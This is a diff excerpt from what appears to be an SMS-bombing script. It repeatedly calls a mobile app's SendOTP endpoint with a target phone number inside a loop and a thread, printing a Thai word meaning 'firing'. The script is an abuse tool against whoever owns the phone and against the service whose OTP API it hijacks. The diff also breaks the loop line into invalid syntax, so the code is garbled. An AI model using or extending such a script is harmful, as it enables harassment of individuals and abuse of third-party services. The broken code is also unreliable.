@@ -738,10 +738,10 @@ def test200():
 		print("กำลังยิง")
 def test201():
 	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
-		print("กำลังยิง")
+		print("กำลังยิง")  
 
 
-for i in range(num):
+i in range(num):
 	time.sleep(1)
 	
 threading.Thread(target=test).start()
